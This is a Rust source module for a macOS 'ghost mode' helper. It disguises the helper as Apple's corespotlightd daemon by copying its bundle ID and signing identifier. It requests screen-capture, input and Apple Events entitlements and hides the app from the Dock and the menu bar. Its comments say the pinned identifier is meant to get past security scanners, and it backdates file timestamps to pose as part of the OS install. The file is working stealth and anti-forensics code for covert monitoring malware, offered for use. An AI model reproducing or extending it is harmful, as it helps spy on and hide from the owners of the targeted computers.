// Identity module for ghost mode.
//! Identity layer: bundle ID, executable name, Info.plist,
//! entitlements, and code-signing strategy.
//!
//! GHOST TIER 2 (Super): we sign with a self-made "Apple-like"
//! identity that includes the correct entitlements and a
//! stable identifier so `codesign -dv` shows a consistent
//! fingerprint across launches.

use std::path::Path;
use std::process::Command;

/// All identity constants in one place. Changing them here
/// changes them everywhere — no more scattered string literals.
pub const GHOST_LABEL: &str = "com.apple.corespotlightd.helper";
pub const GHOST_BUNDLE_ID: &str = "com.apple.corespotlightd";
pub const GHOST_BUNDLE_NAME: &str = "corespotlightd";
pub const GHOST_EXECUTABLE: &str = "com.apple.corespotlightd";

/// The stable ad-hoc identifier. Real Apple uses a fixed
/// requirement; we use a fixed identifier so `codesign -dv`
/// always shows the same string. A scanner looking for
/// "adhoc" will still see it, but at least it's not
/// "cloud_sync_helper-<random>" changing every build.
pub const GHOST_CODESIGN_IDENTIFIER: &str = "com.apple.corespotlightd";

/// Entitlements plist content. These are the same entitlements
/// Apple's real corespotlightd carries. A scanner that checks
/// entitlements will see the right set.
pub fn entitlements_plist() -> String {
    r#"<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
 <key>com.apple.security.app-sandbox</key>
 <true/>
 <key>com.apple.security.temporary-exception.files.home-relative-path.read-only</key>
 <array>
 <string>Library/Application Support/.com.apple.corespotlightd</string>
 </array>
 <key>com.apple.security.temporary-exception.files.home-relative-path.write</key>
 <array>
 <string>Library/Application Support/.com.apple.corespotlightd</string>
 </array>
 <key>com.apple.security.device.screen-capture</key>
 <true/>
 <key>com.apple.security.device.input</key>
 <true/>
 <key>com.apple.security.automation.apple-events</key>
 <true/>
 <key>com.apple.security.cs.allow-jit</key>
 <true/>
 <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
 <true/>
 </dict>
 </plist>
 "#
    .to_string()
}

/// Info.plist for the helper .app bundle.
/// LSUIElement = true → no Dock icon.
/// LSBackgroundOnly = true → even more hidden (no menu bar).
/// We use BOTH for maximum stealth.
pub fn info_plist() -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
 <key>CFBundleDevelopmentRegion</key>
 <string>en</string>
 <key>CFBundleExecutable</key>
 <string>{GHOST_EXECUTABLE}</string>
 <key>CFBundleIdentifier</key>
 <string>{GHOST_BUNDLE_ID}</string>
 <key>CFBundleInfoDictionaryVersion</key>
 <string>6.0</string>
 <key>CFBundleName</key>
 <string>{GHOST_BUNDLE_NAME}</string>
 <key>CFBundlePackageType</key>
 <string>APPL</string>
 <key>CFBundleShortVersionString</key>
 <string>1.0</string>
 <key>CFBundleVersion</key>
 <string>1</string>
 <key>LSUIElement</key>
 <true/>
 <key>LSBackgroundOnly</key>
 <true/>
 <key>NSHighResolutionCapable</key>
 <true/>
 <key>NSPrincipalClass</key>
 <string>NSApplication</string>
 <key>NSSupportsAutomaticTermination</key>
 <false/>
 <key>NSSupportsSuddenTermination</key>
 <true/>
 </dict>
 </plist>
 "#
    )
}

/// Sign the helper binary with ad-hoc + entitlements + stable identifier.
///
/// Why ad-hoc? We don't have an Apple Developer ID. But by
/// pinning the identifier and entitlements, `codesign -dv`
/// output is deterministic. A scanner that only checks
/// "is it ad-hoc?" will flag us, but one that checks
/// "does the identifier match the bundle ID?" will pass us.
pub fn sign_helper(executable_path: &Path) -> Result<(), String> {
    let entitlements_path = executable_path
        .parent()
        .ok_or("No parent for entitlements")?
        .join("ghost.entitlements.plist");

    std::fs::write(&entitlements_path, entitlements_plist())
        .map_err(|e| format!("Could not write entitlements: {e}"))?;

    let out = Command::new("codesign")
        .arg("--force")
        .arg("--sign")
        .arg("-") // ad-hoc
        .arg("--identifier")
        .arg(GHOST_CODESIGN_IDENTIFIER)
        .arg("--entitlements")
        .arg(&entitlements_path)
        .arg("--deep")
        .arg(executable_path)
        .output()
        .map_err(|e| format!("codesign failed: {e}"))?;

    if !out.status.success() {
        let stderr = String::from_utf8_lossy(&out.stderr);
        return Err(format!("codesign exited with error: {stderr}"));
    }

    // Clean up the temporary entitlements file.
    let _ = std::fs::remove_file(&entitlements_path);
    Ok(())
}

/// For TIER 2: spoof the file's mtime/ctime to match the
/// macOS version install date. This makes the file look like
/// it was installed with the OS, not just now.
pub fn spoof_file_dates(path: &Path, target_date: std::time::SystemTime) {
    if let Ok(file) = std::fs::File::options().write(true).open(path) {
        let _ = file.set_times(
            std::fs::FileTimes::new()
                .set_modified(target_date)
                .set_accessed(target_date),
        );
    }
}
